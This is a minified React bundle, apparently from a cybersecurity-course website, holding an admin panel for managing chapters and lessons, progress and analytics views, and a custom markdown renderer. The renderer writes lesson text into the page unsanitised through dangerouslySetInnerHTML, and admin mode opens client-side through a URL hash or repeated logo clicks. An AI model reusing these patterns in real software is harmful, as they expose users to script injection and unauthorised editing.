lessons",children:s.jsx(ni,{size:24})}),s.jsxs("div",{className:"admin-stat-info",children:[s.jsx("span",{className:"admin-stat-value",children:ee.totalLessons}),s.jsx("span",{className:"admin-stat-label",children:"Lessons"})]})]}),s.jsxs("div",{className:"admin-stat-card",children:[s.jsx("div",{className:"admin-stat-icon duration",children:s.jsx(io,{size:24})}),s.jsxs("div",{className:"admin-stat-info",children:[s.jsx("span",{className:"admin-stat-value",children:ee.totalDuration}),s.jsx("span",{className:"admin-stat-label",children:"Total Minutes"})]})]}),s.jsxs("div",{className:"admin-stat-card",children:[s.jsx("div",{className:"admin-stat-icon completion",children:s.jsx(Xp,{size:24})}),s.jsxs("div",{className:"admin-stat-info",children:[s.jsxs("span",{className:"admin-stat-value",children:[ee.completionPercent,"%"]}),s.jsx("span",{className:"admin-stat-label",children:"Completed"})]})]})]}),s.jsxs("div",{className:"admin-progress-section",children:[s.jsx("h3",{children:"Course Completion"}),s.jsx("div",{className:"admin-progress-bar-large",children:s.jsx("div",{className:"admin-progress-fill-large",style:{width:`${ee.completionPercent}%`},children:s.jsxs("span",{children:[ee.completedCount,"/",ee.totalLessons," lessons"]})})})]}),s.jsxs("div",{className:"admin-quick-stats",children:[s.jsxs("div",{className:"admin-quick-stat",children:[s.jsx(mp,{size:18}),s.jsxs("span",{children:[ee.totalCodeBlocks," code blocks"]})]}),s.jsxs("div",{className:"admin-quick-stat",children:[s.jsx(zs,{size:18}),s.jsxs("span",{children:[ee.totalTips," tips"]})]}),s.jsxs("div",{className:"admin-quick-stat",children:[s.jsx(on,{size:18}),s.jsxs("span",{children:[ee.totalWarnings," warnings"]})]}),s.jsxs("div",{className:"admin-quick-stat",children:[s.jsx(ph,{size:18}),s.jsxs("span",{children:[ee.totalWordCount.toLocaleString()," words"]})]})]}),s.jsxs("div",{className:"admin-last-accessed",children:[s.jsx(io,{size:16}),s.jsxs("span",{children:["Last accessed: ",va]})]})]}),C==="manage"&&s.jsxs("div",{className:"admin-manage",children:[s.jsxs("div",{className:"admin-section-title",children:[s.jsx(so,{size:20}),s.jsx("span",{children:"Content Management"})]}),s.jsxs("div",{className:"admin-action-grid",children:[s.jsxs("button",{className:"admin-crud-btn create",onClick:Ms,children:[s.jsx(gh,{size:20}),s.jsx("span",{children:"Add Chapter"})]}),s.jsxs("button",{className:"admin-crud-btn import",onClick:()=>document.getElementById("import-input").click(),children:[s.jsx(Wp,{size:20}),s.jsx("span",{children:"Import Course"})]}),s.jsx("input",{id:"import-input",type:"file",accept:".json",onChange:Fl,style:{display:"none"}}),s.jsxs("button",{className:"admin-crud-btn export",onClick:Ta,children:[s.jsx(hh,{size:20}),s.jsx("span",{children:"Export Course"})]}),s.jsxs("button",{className:"admin-crud-btn markdown",onClick:Rs,children:[s.jsx(pp,{size:20}),s.jsx("span",{children:"Export Markdown"})]}),s.jsxs("button",{className:"admin-crud-btn reset",onClick:di,children:[s.jsx(kp,{size:20}),s.jsx("span",{children:"Reset to Default"})]}),s.jsxs("button",{className:`admin-crud-btn bulk ${ll?"active":""}`,onClick:()=>Cl(!ll),children:[s.jsx(vh,{size:20}),s.jsx("span",{children:"Bulk Mode"})]})]}),ll&&xe.size>0&&s.jsxs("div",{className:"bulk-actions-bar",children:[s.jsxs("span",{children:[xe.size," selected"]}),s.jsx("button",{className:"bulk-btn",onClick:ks,children:"Select All"}),s.jsx("button",{className:"bulk-btn",onClick:Sa,children:"Deselect All"}),s.jsxs("button",{className:"bulk-btn complete",onClick:xa,children:[s.jsx(tl,{size:16})," Mark Complete"]}),s.jsxs("button",{className:"bulk-btn incomplete",onClick:ja,children:[s.jsx(no,{size:16})," Mark Incomplete"]}),s.jsxs("button",{className:"bulk-btn delete",onClick:nl,children:[s.jsx(un,{size:16})," Delete"]})]}),s.jsxs("div",{className:"admin-search-bar",children:[s.jsxs("div",{className:"search-input-wrapper",children:[s.jsx(Pu,{size:18}),s.jsx("input",{type:"text",placeholder:"Search lessons...",value:w,onChange:o=>U(o.target.value),className:"search-input"})]}),s.jsxs("select",{value:P,onChange:o=>ie(o.target.value),className:"sort-select",children:[s.jsx("option",{value:"order",children:"Sort: Chapter Order"}),s.jsx("option",{value:"words",children:"Sort: Word Count"}),s.jsx("option",{value:"duration",children:"Sort: Duration"})]})]}),s.jsx("div",{className:"admin-chapters-list",children:Xe.chapters.map((o,T)=>s.jsxs("div",{className:`admin-chapter-item ${o._modified?"modified":""} ${o._new?"new":""}`,children:[s.jsxs("div",{className:"admin-chapter-header",children:[s.jsxs("div",{className:"admin-chapter-info",onClick:()=>_s(o.id),children:[Q[o.id]?s.jsx(lp,{size:18}):s.jsx(ii,{size:18}),s.jsx("div",{className:"admin-chapter-badge",children:o.id}),s.jsxs("div",{className:"admin-chapter-text",children:[s.jsxs("span",{className:"admin-chapter-title",children:[o.title,o._modified&&s.jsx("span",{className:"badge-inline modified",children:"Modified"}),o._new&&s.jsx("span",{className:"badge-inline new",children:"New"})]}),s.jsx("span",{className:"admin-chapter-desc",children:o.description})]})]}),s.jsxs("div",{className:"admin-chapter-actions",children:[s.jsx("button",{className:"icon-btn",onClick:()=>ri(o.id,"up"),disabled:T===0,title:"Move Up",children:s.jsx(fh,{size:16})}),s.jsx("button",{className:"icon-btn",onClick:()=>ri(o.id,"down"),disabled:T===Xe.chapters.length-1,title:"Move Down",children:s.jsx(rh,{size:16})}),s.jsx("button",{className:"icon-btn edit",onClick:()=>ui(o),title:"Edit",children:s.jsx(cn,{size:16})}),s.jsx("button",{className:"icon-btn add",onClick:()=>si(o.id),title:"Add Lesson",children:s.jsx(gh,{size:16})}),s.jsx("button",{className:"icon-btn delete",onClick:()=>$l(o),title:"Delete",children:s.jsx(un,{size:16})})]})]}),Q[o.id]&&s.jsxs("div",{className:"admin-lessons-list",children:[o.lessons.map((b,E)=>{const M=ve.includes(b.id),V=Wl(b.content),$=xe.has(b.id);return s.jsxs("div",{className:`admin-lesson-item ${b._modified?"modified":""} ${$?"selected":""}`,children:[ll&&s.jsx("button",{className:"bulk-checkbox",onClick:()=>Hs(b.id),children:$?s.jsx(vh,{size:18}):s.jsx(Gp,{size:18})}),s.jsxs("div",{className:"admin-lesson-info",onClick:()=>Ge(b),children:[M?s.jsx(tl,{size:16,className:"icon-complete"}):s.jsx(ni,{size:16}),s.jsxs("span",{className:"admin-lesson-title",children:[b.title,b._modified&&s.jsx("span",{className:"badge-inline modified",children:"Modified"})]})]}),s.jsxs("div",{className:"admin-lesson-meta",children:[s.jsx("span",{className:"meta-id",children:b.id}),s.jsx("span",{className:"meta-duration",children:b.duration}),s.jsxs("span",{className:`meta-words ${V.wordCount<200?"warning":""}`,children:[V.wordCount,"w"]})]}),s.jsxs("div",{className:"admin-lesson-actions",children:[s.jsx("button",{className:"icon-btn",onClick:()=>fi(b.id,o.id,"up"),disabled:E===0,title:"Move Up",children:s.jsx(fh,{size:14})}),s.jsx("button",{className:"icon-btn",onClick:()=>fi(b.id,o.id,"down"),disabled:E===o.lessons.length-1,title:"Move Down",children:s.jsx(rh,{size:14})}),s.jsx("button",{className:"icon-btn edit",onClick:()=>fn(b,o.id),title:"Edit",children:s.jsx(cn,{size:14})}),s.jsx("button",{className:"icon-btn delete",onClick:()=>pt(b,o.id),title:"Delete",children:s.jsx(un,{size:14})})]})]},b.id)}),o.lessons.length===0&&s.jsxs("div",{className:"admin-empty-lessons",children:["No lessons yet. ",s.jsx("button",{onClick:()=>si(o.id),children:"Add one"})]})]})]},o.id))})]}),C==="content"&&s.jsxs("div",{className:"admin-content-manager",children:[s.jsxs("div",{className:"admin-section-title",children:[s.jsx(Es,{size:20}),s.jsx("span",{children:"Content Browser"})]}),s.jsxs("div",{className:"admin-search-bar",children:[s.jsxs("div",{className:"search-input-wrapper",children:[s.jsx(Pu,{size:18}),s.jsx("input",{type:"text",placeholder:"Search lessons...",value:w,onChange:o=>U(o.target.value),className:"search-input"})]}),s.jsxs("select",{value:P,onChange:o=>ie(o.target.value),className:"sort-select",children:[s.jsx("option",{value:"order",children:"Sort: Chapter Order"}),s.jsx("option",{value:"words",children:"Sort: Word Count"}),s.jsx("option",{value:"duration",children:"Sort: Duration"})]})]}),s.jsxs("div",{className:"admin-content-split",children:[s.jsxs("div",{className:"admin-lesson-list-panel",children:[ga.map(o=>{const T=Wl(o.content),b=ve.includes(o.id);return s.jsxs("div",{className:`admin-content-item ${se?.id===o.id?"selected":""}`,onClick:()=>Ge(o),children:[s.jsxs("div",{className:"admin-content-item-header",children:[b?s.jsx(tl,{size:16,className:"icon-complete"}):s.jsx(ni,{size:16}),s.jsx("span",{className:"admin-content-item-title",children:o.title})]}),s.jsxs("div",{className:"admin-content-item-meta",children:[s.jsxs("span",{children:["Ch ",o.chapterId]}),s.jsx("span",{children:o.duration}),s.jsxs("span",{className:T.wordCount<200?"warning":"",children:[T.wordCount," words"]})]})]},o.id)}),ga.length===0&&s.jsxs("div",{className:"admin-empty-state",children:[s.jsx(Pu,{size:48}),s.jsx("p",{children:"No lessons found"})]})]}),s.jsx("div",{className:"admin-lesson-detail-panel",children:se?s.jsxs(s.Fragment,{children:[s.jsxs("div",{className:"admin-detail-header",children:[s.jsx("h2",{children:se.title}),s.jsxs("div",{className:"admin-detail-actions",children:[s.jsxs("button",{className:"icon-btn edit",onClick:()=>fn(se,se.chapterId),children:[s.jsx(cn,{size:16})," Edit"]}),s.jsxs("button",{className:"icon-btn",onClick:hn,children:[s.jsx(Fu,{size:16})," Copy"]})]})]}),s.jsxs("div",{className:"admin-detail-meta",children:[s.jsxs("span",{children:[s.jsx("strong",{children:"ID:"})," ",se.id]}),s.jsxs("span",{children:[s.jsx("strong",{children:"Duration:"})," ",se.duration]}),s.jsxs("span",{children:[s.jsx("strong",{children:"Words:"})," ",Wl(se.content).wordCount]}),s.jsxs("span",{children:[s.jsx("strong",{children:"Code Blocks:"})," ",Wl(se.content).codeBlocks]})]}),s.jsx("div",{className:"admin-detail-content",children:Na(se.content)})]}):s.jsxs("div",{className:"admin-empty-state",children:[s.jsx(mh,{size:48}),s.jsx("p",{children:"Select a lesson to view details"})]})})]})]}),C==="progress"&&s.jsxs("div",{className:"admin-progress-tracker",children:[s.jsxs("div",{className:"admin-section-title",children:[s.jsx(Sh,{size:20}),s.jsx("span",{children:"Student Progress Tracker"})]}),s.jsx("div",{className:"admin-overall-progress",children:s.jsxs("div",{className:"admin-progress-circle",children:[s.jsxs("svg",{viewBox:"0 0 100 100",children:[s.jsx("circle",{cx:"50",cy:"50",r:"45",fill:"none",stroke:"rgba(239, 68, 68, 0.2)",strokeWidth:"8"}),s.jsx("circle",{cx:"50",cy:"50",r:"45",fill:"none",stroke:"#ef4444",strokeWidth:"8",strokeDasharray:`${ee.completionPercent*2.83} 283`,strokeLinecap:"round",transform:"rotate(-90 50 50)"})]}),s.jsxs("div",{className:"admin-progress-circle-text",children:[s.jsxs("span",{className:"percent",children:[ee.completionPercent,"%"]}),s.jsx("span",{className:"label",children:"Complete"})]})]})}),s.jsxs("div",{className:"admin-chapter-progress",children:[s.jsx("h4",{children:"Progress by Chapter"}),ee.chapterProgress.map(o=>s.jsxs("div",{className:"admin-chapter-progress-item",children:[s.jsxs("div",{className:"admin-chapter-progress-header",children:[s.jsxs("span",{className:"chapter-name",children:["Ch ",o.id,": ",o.title]}),s.jsxs("span",{className:"chapter-stats",children:[o.completed,"/",o.total]})]}),s.jsx("div",{className:"admin-chapter-progress-bar",children:s.jsx("div",{className:"admin-chapter-progress-fill",style:{width:`${o.percent}%`}})})]},o.id))]}),s.jsxs("div",{className:"admin-completed-lessons",children:[s.jsxs("h4",{children:["Completed Lessons (",ve.length,")"]}),s.jsx("div",{className:"admin-completed-list",children:ve.length===0?s.jsx("div",{className:"admin-empty-state",children:"No lessons completed yet"}):ve.map(o=>{const T=Xe.chapters.flatMap(b=>b.lessons).find(b=>b.id===o);return T?s.jsxs("div",{className:"admin-completed-item",children:[s.jsx(tl,{size:14}),s.jsx("span",{children:T.title})]},o):null})})]}),s.jsxs("div",{className:"admin-progress-actions",children:[s.jsxs("button",{className:"admin-action-btn export",onClick:Il,children:[s.jsx(hh,{size:18}),"Export Progress"]}),s.jsxs("button",{className:"admin-action-btn reset",onClick:dn,children:[s.jsx(un,{size:18}),"Reset Progress"]})]})]}),C==="analytics"&&s.jsxs("div",{className:"admin-analytics",children:[s.jsxs("div",{className:"admin-section-title",children:[s.jsx(dh,{size:20}),s.jsx("span",{children:"Course Analytics"})]}),s.jsxs("div",{className:"admin-analytics-grid",children:[s.jsxs("div",{className:"admin-analytics-card",children:[s.jsxs("div",{className:"admin-analytics-card-header",children:[s.jsx(ph,{size:20}),s.jsx("span",{children:"Word Count"})]}),s.jsx("div",{className:"admin-analytics-card-value",children:ee.totalWordCount.toLocaleString()}),s.jsxs("div",{className:"admin-analytics-card-sub",children:["Avg: ",ee.avgWordCount," per lesson"]})]}),s.jsxs("div",{className:"admin-analytics-card",children:[s.jsxs("div",{className:"admin-analytics-card-header",children:[s.jsx($u,{size:20}),s.jsx("span",{children:"Code Blocks"})]}),s.jsx("div",{className:"admin-analytics-card-value",children:ee.totalCodeBlocks}),s.jsxs("div",{className:"admin-analytics-card-sub",children:["Avg: ",(ee.totalCodeBlocks/ee.totalLessons).toFixed(1)," per lesson"]})]}),s.jsxs("div",{className:"admin-analytics-card",children:[s.jsxs("div",{className:"admin-analytics-card-header",children:[s.jsx(zs,{size:20}),s.jsx("span",{children:"Pro Tips"})]}),s.jsx("div",{className:"admin-analytics-card-value",children:ee.totalTips}),s.jsxs("div",{className:"admin-analytics-card-sub",children:[ee.noTipLessons.length," lessons without tips"]})]}),s.jsxs("div",{className:"admin-analytics-card",children:[s.jsxs("div",{className:"admin-analytics-card-header",children:[s.jsx(on,{size:20}),s.jsx("span",{children:"Warnings"})]}),s.jsx("div",{className:"admin-analytics-card-value",children:ee.totalWarnings}),s.jsx("div",{className:"admin-analytics-card-sub",children:"Security & safety notes"})]})]}),s.jsxs("div",{className:"admin-quality-breakdown",children:[s.jsx("h4",{children:"Content Quality Indicators"}),s.jsxs("div",{className:"admin-quality-item",children:[s.jsxs("div",{className:"admin-quality-label",children:[s.jsx("span",{children:"Lessons with Code Examples"}),s.jsxs("span",{children:[ee.totalLessons-ee.noCodeLessons.length,"/",ee.totalLessons]})]}),s.jsx("div",{className:"admin-quality-bar",children:s.jsx("div",{className:"admin-quality-fill good",style:{width:`${(ee.totalLessons-ee.noCodeLessons.length)/ee.totalLessons*100}%`}})})]}),s.jsxs("div",{className:"admin-quality-item",children:[s.jsxs("div",{className:"admin-quality-label",children:[s.jsx("span",{children:"Lessons with Pro Tips"}),s.jsxs("span",{children:[ee.totalLessons-ee.noTipLessons.length,"/",ee.totalLessons]})]}),s.jsx("div",{className:"admin-quality-bar",children:s.jsx("div",{className:"admin-quality-fill good",style:{width:`${(ee.totalLessons-ee.noTipLessons.length)/ee.totalLessons*100}%`}})})]}),s.jsxs("div",{className:"admin-quality-item",children:[s.jsxs("div",{className:"admin-quality-label",children:[s.jsx("span",{children:"Lessons with >200 Words"}),s.jsxs("span",{children:[ee.totalLessons-ee.shortLessons.length,"/",ee.totalLessons]})]}),s.jsx("div",{className:"admin-quality-bar",children:s.jsx("div",{className:"admin-quality-fill good",style:{width:`${(ee.totalLessons-ee.shortLessons.length)/ee.totalLessons*100}%`}})})]})]}),s.jsxs("div",{className:"admin-lesson-stats-table",children:[s.jsx("h4",{children:"Detailed Lesson Statistics"}),s.jsx("div",{className:"admin-table-container",children:s.jsxs("table",{children:[s.jsx("thead",{children:s.jsxs("tr",{children:[s.jsx("th",{children:"Lesson"}),s.jsx("th",{children:"Words"}),s.jsx("th",{children:"Code"}),s.jsx("th",{children:"Tips"}),s.jsx("th",{children:"Warn"})]})}),s.jsx("tbody",{children:ee.lessonStats.map(o=>s.jsxs("tr",{className:o.wordCount<200?"warning-row":"",children:[s.jsx("td",{children:o.title}),s.jsx("td",{children:o.wordCount}),s.jsx("td",{children:o.codeBlocks}),s.jsx("td",{children:o.tips}),s.jsx("td",{children:o.warnings})]},o.id))})]})})]})]}),C==="editor"&&s.jsxs("div",{className:"admin-editor",children:[s.jsxs("div",{className:"admin-section-title",children:[s.jsx(cn,{size:20}),s.jsx("span",{children:De?"Edit Lesson":"Content Editor"})]}),De?s.jsxs(s.Fragment,{children:[s.jsxs("div",{className:"editor-header",children:[s.jsxs("div",{className:"editor-form-row",children:[s.jsxs("div",{className:"form-group flex-1",children:[s.jsx("label",{children:"Title"}),s.jsx("input",{type:"text",value:f.title,onChange:o=>j({...f,title:o.target.value}),className:"form-input"})]}),s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Duration"}),s.jsx("input",{type:"text",value:f.duration,onChange:o=>j({...f,duration:o.target.value}),className:"form-input",style:{width:"120px"}})]})]}),s.jsxs("div",{className:"editor-actions",children:[s.jsxs("button",{className:`toggle-btn ${re?"active":""}`,onClick:()=>lt(!re),children:[re?s.jsx(fp,{size:16}):s.jsx(Iu,{size:16}),re?"Hide Preview":"Live Preview"]}),s.jsxs("button",{className:"copy-btn",onClick:hn,children:[s.jsx(Fu,{size:16})," Copy"]}),s.jsx("button",{className:"cancel-btn",onClick:()=>{Je(null),j({id:"",title:"",duration:"",content:"",chapterId:""})},children:"Cancel"}),s.jsxs("button",{className:"save-btn",onClick:oi,children:[s.jsx(Nh,{size:16})," Save Changes"]})]})]}),s.jsxs("div",{className:`editor-container ${re?"split":""}`,children:[s.jsxs("div",{className:"editor-textarea-wrapper",children:[s.jsxs("div",{className:"editor-textarea-header",children:[s.jsx($u,{size:16})," Markdown Content"]}),s.jsx("textarea",{value:f.content,onChange:o=>j({...f,content:o.target.value}),className:"editor-textarea",placeholder:"Write your lesson content in markdown..."})]}),re&&s.jsxs("div",{className:"editor-preview-wrapper",children:[s.jsxs("div",{className:"editor-preview-header",children:[s.jsx(Iu,{size:16})," Live Preview"]}),s.jsxs("div",{className:"editor-preview",children:[s.jsx("h1",{children:f.title}),Na(f.content)]})]})]})]}):s.jsxs(s.Fragment,{children:[s.jsxs("div",{className:"admin-lesson-selector",children:[s.jsxs("select",{value:se?.id||"",onChange:o=>{const T=Xe.chapters.flatMap(b=>b.lessons.map(E=>({...E,chapterId:b.id}))).find(b=>b.id===o.target.value);Ge(T)},children:[s.jsx("option",{value:"",children:"Select a lesson to edit..."}),Xe.chapters.map(o=>s.jsx("optgroup",{label:`Chapter ${o.id}: ${o.title}`,children:o.lessons.map(T=>s.jsx("option",{value:T.id,children:T.title},T.id))},o.id))]}),se&&s.jsxs("button",{className:"edit-selected-btn",onClick:()=>fn(se,se.chapterId),children:[s.jsx(cn,{size:16})," Edit This Lesson"]})]}),se?s.jsxs(s.Fragment,{children:[s.jsxs("div",{className:"admin-view-toggle",children:[s.jsxs("button",{className:`toggle-btn ${Ve?"":"active"}`,onClick:()=>mt(!1),children:[s.jsx(Iu,{size:16}),"Rendered"]}),s.jsxs("button",{className:`toggle-btn ${Ve?"active":""}`,onClick:()=>mt(!0),children:[s.jsx($u,{size:16}),"Raw"]}),s.jsxs("button",{className:"copy-btn",onClick:hn,children:[s.jsx(Fu,{size:16}),"Copy"]})]}),s.jsxs("div",{className:"admin-lesson-meta",children:[s.jsxs("span",{children:[s.jsx("strong",{children:"ID:"})," ",se.id]}),s.jsxs("span",{children:[s.jsx("strong",{children:"Duration:"})," ",se.duration]}),s.jsxs("span",{children:[s.jsx("strong",{children:"Words:"})," ",Wl(se.content).wordCount]})]}),s.jsx("div",{className:"admin-preview-container",children:Ve?s.jsx("pre",{className:"admin-raw-content",children:se.content}):s.jsxs("div",{className:"admin-rendered-content",children:[s.jsx("h1",{children:se.title}),Na(se.content)]})})]}):s.jsxs("div",{className:"admin-empty-state",children:[s.jsx(mh,{size:48}),s.jsx("p",{children:"Select a lesson to preview or edit"})]})]})]}),C==="trash"&&s.jsxs("div",{className:"admin-trash",children:[s.jsxs("div",{className:"admin-section-title",children:[s.jsx(un,{size:20}),s.jsxs("span",{children:["Trash (",O.chapters.length+O.lessons.length," items)"]}),(O.chapters.length>0||O.lessons.length>0)&&s.jsx("button",{className:"empty-trash-btn",onClick:Ds,children:"Empty Trash"})]}),O.chapters.length===0&&O.lessons.length===0?s.jsxs("div",{className:"admin-empty-state",children:[s.jsx($y,{size:48}),s.jsx("p",{children:"Trash is empty"})]}):s.jsxs(s.Fragment,{children:[O.chapters.length>0&&s.jsxs("div",{className:"trash-section",children:[s.jsx("h4",{children:"Deleted Chapters"}),O.chapters.map(o=>s.jsxs("div",{className:"trash-item",children:[s.jsxs("div",{className:"trash-item-info",children:[s.jsx(Es,{size:18}),s.jsxs("div",{children:[s.jsxs("span",{className:"trash-item-title",children:["Chapter ",o.id,": ",o.title]}),s.jsxs("span",{className:"trash-item-meta",children:[o.lessons?.length||0," lessons • Deleted ",new Date(o.deletedAt).toLocaleDateString()]})]})]}),s.jsxs("button",{className:"restore-btn",onClick:()=>$t(o),children:[s.jsx(bh,{size:16})," Restore"]})]},o.id))]}),O.lessons.length>0&&s.jsxs("div",{className:"trash-section",children:[s.jsx("h4",{children:"Deleted Lessons"}),O.lessons.map(o=>s.jsxs("div",{className:"trash-item",children:[s.jsxs("div",{className:"trash-item-info",children:[s.jsx(ni,{size:18}),s.jsxs("div",{children:[s.jsx("span",{className:"trash-item-title",children:o.title}),s.jsxs("span",{className:"trash-item-meta",children:["From Chapter ",o.chapterId," • Deleted ",new Date(o.deletedAt).toLocaleDateString()]})]})]}),s.jsxs("button",{className:"restore-btn",onClick:()=>gt(o),children:[s.jsx(bh,{size:16})," Restore"]})]},o.id))]})]})]})]})]})]})}const jh={1:{src:"/infographics/ch1-what-is-cybersecurity.jpg",alt:"What is Cybersecurity - CIA Triad & Internet Basics"},2:{src:"/infographics/ch2-passwords-authentication.jpg",alt:"Passwords & Authentication - Cracking, Rainbow Tables, 2FA"},3:{src:"/infographics/ch3-social-engineering.jpg",alt:"Social Engineering - Phishing, Vishing, Baiting, Pretexting"},4:{src:"/infographics/ch4-encryption-cryptography.jpg",alt:"Encryption & Cryptography - Symmetric, Asymmetric, HTTPS, Hashing"},5:{src:"/infographics/ch5-network-security.jpg",alt:"Network Security - Scanning, Firewalls, IDS/IPS"},6:{src:"/infographics/ch6-web-vulnerabilities.jpg",alt:"Web Vulnerabilities - SQL Injection, XSS, CSRF"},7:{src:"/infographics/ch7-ethical-hacking-tools.jpg",alt:"Ethical Hacking Toolkit - Nmap, Metasploit, Burp Suite"},8:{src:"/infographics/ch8-capture-the-flag.jpg",alt:"Capture The Flag - CTF Categories & Platforms"}};function l1(){const[z,B]=F.useState(!1),[X,m]=F.useState("home"),[k,W]=F.useState(null),[ce,Me]=F.useState([]),[q,C]=F.useState(!1),[ue,Q]=F.useState(0),Te=F.useRef(null);F.useEffect(()=>{const O=localStorage.getItem("cybersecurity-progress");O&&Me(JSON.parse(O)),window.location.hash==="#admin"&&C(!0)},[]),F.useEffect(()=>{localStorage.setItem("cybersecurity-last-accessed",Date.now().toString())},[X,k]);const se=()=>{Q(O=>O+1),Te.current&&clearTimeout(Te.current),Te.current=setTimeout(()=>{Q(0)},2e3),ue>=4&&(C(!0),Q(0))},Ge=O=>{const R=[...ce,O];Me(R),localStorage.setItem("cybersecurity-progress",JSON.stringify(R))},Ve=Qt.chapters.reduce((O,R)=>O+R.lessons.length,0),mt=Math.round(ce.length/Ve*100),ve=O=>{W(O),m("lesson"),B(!1),window.scrollTo(0,0)},st=()=>{if(!k)return null;for(let O=0;O<Qt.chapters.length;O++){const R=Qt.chapters[O];for(let D=0;D<R.lessons.length;D++)if(R.lessons[D].id===k.id){if(D<R.lessons.length-1)return R.lessons[D+1];if(O<Qt.chapters.length-1)return Qt.chapters[O+1].lessons[0]}}return null},G=()=>{if(!k)return null;for(let O=0;O<Qt.chapters.length;O++){const R=Qt.chapters[O];for(let D=0;D<R.lessons.length;D++)if(R.lessons[D].id===k.id){if(D>0)return R.lessons[D-1];if(O>0){const H=Qt.chapters[O-1];return H.lessons[H.lessons.length-1]}}}return null},tt=O=>{const R=O.trim().split(`
`),D=[];let H=0,Ke=!1,He=[],ft="";for(;H<R.length;){const pe=R[H];if(pe.startsWith("```")){Ke?(D.push(s.jsxs("div",{className:"code-block",children:[s.jsxs("div",{className:"code-header",children:[s.jsx("span",{className:"code-language",children:ft}),s.jsx("button",{className:"code-copy",onClick:()=>navigator.clipboard.writeText(He.join(`
`)),children:"Copy"})]}),s.jsx("div",{className:"code-content",children:s.jsx("pre",{children:He.join(`
`)})})]},`code-${H}`)),Ke=!1):(Ke=!0,ft=pe.slice(3).trim()||"text",He=[]),H++;continue}if(Ke){He.push(pe),H++;continue}if(pe.includes("<tip>")){let De=[];for(H++;H<R.length&&!R[H].includes("</tip>");)De.push(R[H]),H++;D.push(s.jsxs("div",{className:"tip-box",children:[s.jsxs("div",{className:"tip-box-header",children:[s.jsx(zs,{size:18}),s.jsx("span",{children:"Pro Tip"})]}),s.jsx("p",{children:De.join(" ").replace("💡 ","")})]},`tip-${H}`)),H++;continue}if(pe.includes("<warning>")){let De=[];for(H++;H<R.length&&!R[H].includes("</warning>");)De.push(R[H]),H++;D.push(s.jsxs("div",{className:"warning-box",children:[s.jsxs("div",{className:"warning-box-header",children:[s.jsx(on,{size:18}),s.jsx("span",{children:"Warning"})]}),s.jsx("p",{children:De.join(" ").replace("⚠️ ","")})]},`warn-${H}`)),H++;continue}if(pe.startsWith("## ")){D.push(s.jsx("h2",{children:pe.slice(3)},`h2-${H}`)),H++;continue}if(pe.startsWith("### ")){D.push(s.jsx("h3",{children:pe.slice(4)},`h3-${H}`)),H++;continue}if(pe.includes("|")&&R[H+1]?.includes("---")){const De=pe.split("|").filter(Ne=>Ne.trim()).map(Ne=>Ne.trim());H+=2;const Je=[];for(;H<R.length&&R[H].includes("|");)Je.push(R[H].split("|").filter(Ne=>Ne.trim()).map(Ne=>Ne.trim())),H++;D.push(s.jsx("div",{style:{overflowX:"auto",margin:"20px 0"},children:s.jsxs("table",{style:{width:"100%",borderCollapse:"collapse",background:"var(--bg-card)",borderRadius:"12px",overflow:"hidden"},children:[s.jsx("thead",{children:s.jsx("tr",{children:De.map((Ne,S)=>s.jsx("th",{style:{padding:"12px 16px",textAlign:"left",borderBottom:"1px solid var(--border-color)",color:"var(--accent-red)"},children:Ne},S))})}),s.jsx("tbody",{children:Je.map((Ne,S)=>s.jsx("tr",{children:Ne.map((_,K)=>s.jsx("td",{style:{padding:"12px 16px",borderBottom:"1px solid var(--border-color)",color:"var(--text-secondary)"},children:s.jsx("span",{dangerouslySetInnerHTML:{__html:_.replace(/\*\*(.*?)\*\*/g,'<strong style="color:var(--text-primary)">$1</strong>').replace(/`(.*?)`/g,'<code style="background:rgba(239,68,68,0.1);padding:2px 6px;border-radius:4px;font-size:13px">$1</code>')}})},K))},S))})]})},`table-${H}`));continue}if(pe.startsWith("- ")||pe.startsWith("* ")){const De=[];for(;H<R.length&&(R[H].startsWith("- ")||R[H].startsWith("* "));)De.push(R[H].slice(2)),H++;D.push(s.jsx("ul",{children:De.map((Je,Ne)=>s.jsx("li",{dangerouslySetInnerHTML:{__html:Je.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>").replace(/`(.*?)`/g,'<code style="background:rgba(239,68,68,0.1);padding:2px 6px;border-radius:4px">$1</code>')}},Ne))},`ul-${H}`));continue}if(/^\d+\. /.test(pe)){const De=[];for(;H<R.length&&/^\d+\. /.test(R[H]);)De.push(R[H].replace(/^\d+\. /,"")),H++;D.push(s.jsx("ol",{children:De.map((Je,Ne)=>s.jsx("li",{dangerouslySetInnerHTML:{__html:Je.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>").replace(/`(.*?)`/g,'<code style="background:rgba(239,68,68,0.1);padding:2px 6px;border-radius:4px">$1</code>')}},Ne))},`ol-${H}`));continue}pe.trim()&&D.push(s.jsx("p",{dangerouslySetInnerHTML:{__html:pe.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>").replace(/`(.*?)`/g,'<code style="background:rgba(239,68,68,0.1);padding:2px 6px;border-radius:4px;font-family:JetBrains Mono,monospace;font-size:14px">$1</code>').replace(/\[(.*?)\]\((.*?)\)/g,'<a href="$2" target="_blank" style="color:var(--accent-cyan)">$1</a>')}},`p-${H}`)),H++}return D};return s.jsxs("div",{className:"app-container",children:[s.jsx("div",{className:"bg-grid"}),s.jsx("div",{className:"bg-noise"}),s.jsx("div",{className:"gradient-orb orb-red"}),s.jsx("div",{className:"gradient-orb orb-cyan"}),s.jsx("div",{className:"gradient-orb orb-purple"}),s.jsx("button",{className:"mobile-menu-btn",onClick:()=>B(!z),children:z?s.jsx(ws,{size:24}):s.jsx(zp,{size:24})}),s.jsx("div",{className:`sidebar-overlay ${z?"open":""}`,onClick:()=>B(!1)}),s.jsxs("aside",{className:`sidebar ${z?"open":""}`,children:[s.jsxs("div",{className:"sidebar-header",onClick:se,style:{cursor:"pointer"},children:[s.jsx("div",{className:"sidebar-logo",children:s.jsx(Os,{size:24})}),s.jsx("span",{className:"sidebar-title",children:"Cybersecurity"})]}),s.jsxs("nav",{className:"sidebar-nav",children:[s.jsxs("div",{className:`nav-item ${X==="home"?"active":""}`,onClick:()=>{m("home"),B(!1)},children:[s.jsx(Sp,{size:20,className:"nav-item-icon"}),s.jsx("span",{children:"Home"})]}),Qt.chapters.map(O=>s.jsxs("div",{className:"nav-section",children:[s.jsxs("div",{className:"nav-section-title",children:["Ch ",O.id,": ",O.title]}),O.lessons.map(R=>s.jsxs("div",{className:`nav-item 